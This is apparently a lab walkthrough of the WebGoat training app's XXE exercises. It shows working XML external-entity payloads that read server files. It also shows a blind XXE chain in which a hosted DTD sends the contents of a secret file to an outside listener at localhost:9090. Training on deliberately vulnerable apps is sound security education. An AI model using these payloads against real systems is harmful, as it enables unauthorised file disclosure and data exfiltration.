# XXE

## Let's try

Send a comment and watch the request, we can see that request put our content into tag:

```XML
<?xml version="1.0"?>
<comment>  
    <text>
        9
    </text>
</comment>
```

So, we can intercept the request and change the body to:

```XML
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///">]>
<comment><text>&xxe;</text></comment>
```

## Modern REST framework

With previous one, the text was sent to the server by json. Now, we just need to change the content-type to application/xml and send payload like the previos challenge.

## Blind XXE assignment

From the given hints, we can upload file to WebWolf and read it through the xml modify in the challenge.
Upload to WebWolf:

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % all "<!ENTITY send SYSTEM 'http://localhost:9090/landing?text=%file;'>">
```

And change the XML tag in the challenge with this:

```XML
<?xml version="1.0"?>
<!DOCTYPE comment [
<!ENTITY % file SYSTEM "file:///home/webgoat/.webgoat-8.1.0//XXE/secret.txt">
<!ENTITY % remote SYSTEM "http://localhost:9090/files/<NAME>/test.dtd">
%remote;
%all;
]>
<comment>
<text>
&send;
</text>
</comment>
```

Get the comment contain `WebGoat 8.0 rocks ...` and submit it.
